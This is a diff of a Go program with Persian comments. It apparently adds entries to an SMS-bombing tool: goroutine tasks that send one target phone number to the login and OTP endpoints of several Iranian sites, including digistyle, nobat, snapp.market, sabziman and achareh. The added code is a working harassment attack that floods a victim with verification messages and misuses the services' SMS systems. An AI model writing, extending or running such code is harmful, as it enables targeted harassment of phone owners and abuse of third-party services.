@@ -287,6 +287,55 @@ func main() {
 
 
 
+
+
+
+
+       // digistyle.com
+     wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("loginRegister[email_phone]", phone)
+        sendFormRequest(ctx, "https://www.digistyle.com/users/login-register/", formData, &wg, ch)
+    }
+
+    // api.nobat.ir
+    wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("mobile", phone[1:]) // حذف صفر اول
+        formData.Set("use_emta_v2", "yes")
+        formData.Set("domain", "nobat")
+        sendFormRequest(ctx, "https://api.nobat.ir/patient/login/phone", formData, &wg, ch)
+    }
+    // snapp.market (شامل کوئری پارامتر در URL)
+     wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("cellphone", phone)
+        // کوئری پارامترها را به URL اضافه می‌کنیم
+        urlWithQuery := "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=" + phone
+        sendFormRequest(ctx, urlWithQuery, formData, &wg, ch)
+    }
+    // sabziman.com (فرم موجود در کد شما)
+    wg.Add(1)
+    tasks <- func() {
+        formData := url.Values{}
+        formData.Set("action", "newphoneexist")
+        formData.Set("phonenumber", phone)
+        sendFormRequest(ctx, "https://sabziman.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+    }
+    // api.achareh.co (شامل کوئری پارامتر در URL)
+    wg.Add(1)
+    tasks <- func() {
+         // اصلاح نوع payload به map[string]interface{}
+         payload := map[string]interface{}{
+            "phone": "98" + phone[1:], // اضافه کردن 98 و حذف صفر اول بر اساس نمونه
+        }
+        // کوئری پارامتر به URL اضافه می‌شود
+        urlWithQuery := "https://api.achareh.co/v2/accounts/login/?web=true"
+        sendJSONRequest(ctx, urlWithQuery, payload, &wg, ch)
+    }
 		// sabziman.com (Form)
 		wg.Add(1)
 		tasks <- func() {
